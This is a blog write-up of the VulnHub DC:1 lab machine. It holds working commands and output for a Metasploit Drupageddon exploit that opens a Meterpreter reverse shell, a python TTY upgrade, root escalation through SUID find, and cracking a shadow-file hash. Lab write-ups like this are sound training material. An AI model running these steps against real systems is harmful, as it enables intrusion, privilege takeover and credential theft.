---
layout: post
title: DC:1
subtitle: VulnHub Writeup - DC:1
description: Enumerate services, scan the target, and gain access with Metasploit.
image: download.png
optimized_image: download.png
tags:
  - Metasploit
  - Privilege Escalation
  - Find Flags
  - Improve Shell
author: Mustafa Altayeb
date: 2025-09-12 00:00
paginate: true
---

# DC:1
[DC:1 on VulnHub](https://www.vulnhub.com/entry/dc-1,292/)

![DC Banner](download.png)

## Objectives
1. Gain initial access to the machine using Metasploit.
2. Enumerate privilege escalation vectors using manual commands.
3. Find Flags.

## Reconnaissance

### Nmap Scan
Run an initial Nmap scan to identify open ports:

```bash
nmap -p1-65535 --min-rate 1000 192.168.115.130
```

**Results**:
```bash
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
56536/tcp open  unknown
```

Run an advanced Nmap scan:

```bash
nmap -p 22,80,111,56536 -sCV -A 192.168.115.130
```

**Results**:
```bash
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
|_http-title: Welcome to Drupal Site | Drupal Site
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.2.22 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37606/udp   status
|   100024  1          41973/tcp   status
|   100024  1          45138/tcp6  status
|_  100024  1          59416/udp6  status
41973/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:B8:77:FA (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key Findings**:
- **Port 22**: Running SSH.
- **Port 80**: Running Drupal 7.
- **Port 111**: Running RPC.

The most significant finding is Drupal 7.

### Web Enumeration
Visited the web server on port 80:

![Web page](/assets/VulnHubRoomsImage/DC:1/image.png)

After enumeration, nothing interesting was found.

## Gain Access with Metasploit

- Open Metasploit with `msfconsole`:

```bash
msf6 > search Drupal 7

Matching Modules
================
   #   Name                                                              Disclosure Date  Rank       Check  Description
   -   ----                                                              ---------------  ----       -----  -----------
   ...
   16  exploit/multi/http/drupal_drupageddon                             2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
   17    \_ target: Drupal 7.0 - 7.31 (form-cache PHP injection method)  .                .          .      .
   18    \_ target: Drupal 7.0 - 7.31 (user-post PHP injection method)   .                .          .      .
   19  auxiliary/gather/drupal_openid_xxe                                2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   20  exploit/unix/webapp/drupal_restws_exec                            2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
   21  exploit/unix/webapp/drupal_restws_unserialize                     2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
   22    \_ target: PHP In-Memory                                        .                .          .      .
   23    \_ target: Unix In-Memory                                       .                .          .      .
   24  auxiliary/scanner/http/drupal_views_user_enum                     2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   25  exploit/unix/webapp/php_xmlrpc_eval                               2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
```

Select exploit 16 and set options:

```bash
msf6 > use 16
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/drupal_drupageddon) > options

Module options (exploit/multi/http/drupal_drupageddon):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The target URI of the Drupal installation
   VHOST                       no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.115.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Drupal 7.0 - 7.31 (form-cache PHP injection method)

View the full module info with the info, or info -d command.

msf6 exploit(multi/http/drupal_drupageddon) > set RHOSTS 192.168.115.130
RHOSTS => 192.168.115.130
```

Run the exploit:

```bash
msf6 exploit(multi/http/drupal_drupageddon) > run
[*] Started reverse TCP handler on 192.168.115.128:4444 
[*] Sending stage (40004 bytes) to 192.168.115.130
[*] Meterpreter session 1 opened (192.168.115.128:4444 -> 192.168.115.130:47743) at 2025-10-01 15:37:10 -0400
```

Gain Meterpreter shell:

```bash
meterpreter > shell
Process 3370 created.
Channel 0 created.
whoami
www-data
```

## Spawning Shells

Check for Python:

```bash
which python
/usr/bin/python
```

Spawn a TTY shell:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

## Privilege Escalation

Search for files with the SUID bit set:

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Results**:
```bash
/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs
```

The `/usr/bin/find` binary is interesting. Refer to GTFOBins:

![GTFO](/assets/VulnHubRoomsImage/DC:1/imagecopy.png)

Use the following command to escalate privileges:

```bash
find . -exec /bin/sh \; -quit
whoami
root
```

## Going Deeper into the Machine

In `/var/backups/`, a backup of the `passwd` file was found:

```bash
# ls
backups  cache  lib  local  lock  log  mail  opt  run  spool  tmp  www
# cd backups
# ls
apt.extended_states.0  dpkg.status.0  gshadow.bak  shadow.bak
aptitude.pkgstates.0   group.bak      passwd.bak
```

Opening `shadow.bak` reveals a hash for the user `flag4`:

```bash
flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:17946:0:99999:7:::
```

Crack the hash with John the Ripper:

```bash
john hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
orange           (?)
```

The password for `flag4` is `orange`. You can log into the machine via SSH or directly.

This process can be repeated for the root user and other users on the machine.

Thanks for reading!  
Happy hacking!

---

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>

Follow me through these links:

---
```

